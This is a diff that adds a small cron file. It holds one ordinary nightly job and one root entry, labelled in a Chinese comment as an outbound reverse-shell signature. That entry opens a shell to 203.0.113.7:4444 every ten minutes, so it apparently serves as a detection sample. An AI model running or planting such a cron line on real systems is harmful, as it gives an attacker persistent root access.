@@ -1,0 +1,4 @@
+# /etc/cron.d 下的业务任务
+0 2 * * * appuser /opt/app/bin/nightly_job.sh
+# 外联反弹 shell 特征
+*/10 * * * * root /bin/bash -c 'exec 0</dev/tcp/203.0.113.7/4444; sh'
